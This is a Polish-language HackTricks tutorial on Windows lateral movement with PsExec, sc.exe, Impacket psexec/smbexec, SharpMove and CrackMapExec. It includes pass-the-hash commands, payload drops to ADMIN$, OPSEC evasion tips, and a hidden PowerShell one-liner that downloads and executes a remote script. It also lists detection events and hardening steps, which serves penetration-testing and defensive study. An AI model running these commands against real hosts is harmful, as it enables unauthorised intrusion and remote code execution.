# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Jak działają

Techniki te wykorzystują zdalnie Windows Service Control Manager (SCM) przez SMB/RPC do wykonywania poleceń na hoście docelowym. Typowy przebieg wygląda następująco:

1. Uwierzytelnij się na hoście docelowym i uzyskaj dostęp do udziału ADMIN$ przez SMB (TCP/445).
2. Skopiuj plik wykonywalny lub określ wiersz poleceń LOLBAS, który zostanie uruchomiony przez usługę.
3. Utwórz zdalnie usługę za pośrednictwem SCM (MS-SCMR przez \PIPE\svcctl), wskazującą dane polecenie lub plik binarny.
4. Uruchom usługę, aby wykonać payload, i opcjonalnie przechwytuj stdin/stdout za pomocą named pipe.
5. Zatrzymaj usługę i wykonaj cleanup (usuń usługę oraz wszystkie zapisane pliki binarne).

Wymagania/prereqs:
- Local Administrator na hoście docelowym (SeCreateServicePrivilege) lub jawne uprawnienia do tworzenia usług na hoście docelowym.
- Dostępny SMB (445) oraz udział ADMIN$; Remote Service Management musi być dozwolone przez host firewall.
- UAC Remote Restrictions: w przypadku kont lokalnych filtrowanie tokenu może blokować uprawnienia administratora przez sieć, chyba że używane jest wbudowane konto Administrator lub ustawiono LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: użycie hostname/FQDN umożliwia Kerberos; połączenie przez IP często przełącza się na NTLM (i może być blokowane w hardened environments).

### Manual ScExec/WinExec przez sc.exe

Poniżej przedstawiono minimalne podejście do tworzenia usługi. Obraz usługi może być zapisanym plikiem EXE lub LOLBAS, takim jak cmd.exe albo powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Uwagi:
- Podczas uruchamiania EXE niebędącego usługą spodziewaj się błędu przekroczenia limitu czasu; wykonanie nadal nastąpi.
- Aby zachować bardziej przyjazny dla OPSEC charakter, preferuj fileless commands (`cmd /c`, `powershell -enc`) lub usuwaj zrzucone artefakty.

Bardziej szczegółowe kroki znajdziesz tutaj: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Narzędzia i przykłady

### Sysinternals PsExec.exe

- Klasyczne narzędzie administracyjne, które używa SMB do zrzucenia PSEXESVC.exe do ADMIN$, instaluje tymczasową usługę (domyślna nazwa: PSEXESVC) i przekazuje I/O przez nazwane potoki.
- Przykładowe użycia:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Możesz uruchomić bezpośrednio z Sysinternals Live za pośrednictwem WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Pozostawia zdarzenia instalacji/deinstalacji usługi (nazwa usługi to często PSEXESVC, chyba że użyto -r) i podczas wykonywania tworzy C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-like)

- Używa osadzonej usługi podobnej do RemCom. Upuszcza tymczasowy plik binarny usługi (zwykle o losowej nazwie) przez ADMIN$, tworzy usługę (domyślnie często RemComSvc) i przekazuje wejście/wyjście za pośrednictwem nazwanego potoku.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefakty
- Tymczasowy plik EXE w C:\Windows\ (losowe 8 znaków). Nazwa usługi domyślnie to RemComSvc, chyba że zostanie nadpisana.

### Impacket smbexec.py (SMBExec)

- Tworzy tymczasową usługę, która uruchamia cmd.exe i używa nazwanego potoku do obsługi wejścia/wyjścia. Zwykle nie wymaga umieszczania pełnego payloadu EXE; wykonywanie poleceń jest częściowo interaktywne.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementuje kilka metod lateral movement, w tym service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) umożliwia modyfikację/tworzenie usług w celu zdalnego wykonania polecenia.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Możesz również użyć CrackMapExec do wykonywania poleceń za pośrednictwem różnych backendów (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, wykrywanie i artefakty

Typowe artefakty hosta/sieci podczas używania technik podobnych do PsExec:
- Security 4624 (Logon Type 3) i 4672 (Special Privileges) na celu dla użytego konta administratora.
- Security 5140/5145 File Share i File Share Detailed events pokazujące dostęp do ADMIN$ oraz utworzenie/zapis plików binarnych usług (np. PSEXESVC.exe lub losowego 8-znakowego pliku .exe).
- Security 7045 Service Install na celu: nazwy usług takie jak PSEXESVC, RemComSvc lub niestandardowe (-r / -service-name).
- Sysmon 1 (Process Create) dla services.exe lub obrazu usługi, 3 (Network Connect), 11 (File Create) w C:\Windows\, 17/18 (Pipe Created/Connected) dla pipe'ów takich jak \\.\pipe\psexesvc, \\.\pipe\remcom_* lub ich losowych odpowiedników.
- Artefakt rejestru dla Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hoście operatora (jeśli nie został pominięty).

Pomysły na hunting
- Generuj alerty dotyczące instalacji usług, gdy ImagePath zawiera cmd.exe /c, powershell.exe lub lokalizacje TEMP.
- Szukaj utworzeń procesów, dla których ParentImage to C:\Windows\PSEXESVC.exe, lub procesów potomnych services.exe działających jako LOCAL SYSTEM i wykonujących shelle.
- Oznaczaj nazwane pipe'y kończące się na -stdin/-stdout/-stderr lub zawierające dobrze znane nazwy pipe'ów klonów PsExec.

## Rozwiązywanie typowych problemów
- Access is denied (5) podczas tworzenia usług: konto nie jest faktycznie lokalnym administratorem, ograniczenia UAC dla kont lokalnych przy dostępie zdalnym lub ochrona EDR przed manipulacją ścieżką pliku binarnego usługi.
- The network path was not found (53) lub brak możliwości połączenia z ADMIN$: firewall blokuje SMB/RPC albo udziały administracyjne są wyłączone.
- Kerberos fails but NTLM is blocked: połącz się przy użyciu hostname/FQDN (nie adresu IP), upewnij się, że SPN są poprawne, albo podaj -k/-no-pass z ticketami podczas używania Impacket.
- Przekroczono limit czasu uruchamiania usługi, ale payload został wykonany: jest to oczekiwane, jeśli nie jest to prawdziwy plik binarny usługi; przechwytuj output do pliku albo użyj smbexec dla live I/O.

## Uwagi dotyczące hardeningu
- Windows 11 24H2 i Windows Server 2025 domyślnie wymagają SMB signing dla połączeń wychodzących (oraz przychodzących w Windows 11). Nie zakłóca to legalnego użycia PsExec z prawidłowymi creds, ale zapobiega nadużyciom SMB relay bez podpisu i może wpływać na urządzenia, które nie obsługują signing.<sup>[[2]](#references)</sup>
- Nowe blokowanie NTLM przez SMB client (Windows 11 24H2/Server 2025) może uniemożliwić fallback do NTLM podczas łączenia się przez adres IP lub z serwerami bez Kerberos. W hardened environments spowoduje to przerwanie PsExec/SMBExec opartego na NTLM; użyj Kerberos (hostname/FQDN) albo skonfiguruj wyjątki, jeśli jest to uzasadnione.<sup>[[2]](#references)</sup>
- Principle of least privilege: ogranicz członkostwo w lokalnej grupie administratorów, preferuj Just-in-Time/Just-Enough Admin, wymuszaj LAPS oraz monitoruj i generuj alerty dotyczące instalacji usług 7045.

## Zobacz także

- Zdalne wykonywanie oparte na WMI (często bardziej fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- Zdalne wykonywanie oparte na WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## Referencje

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
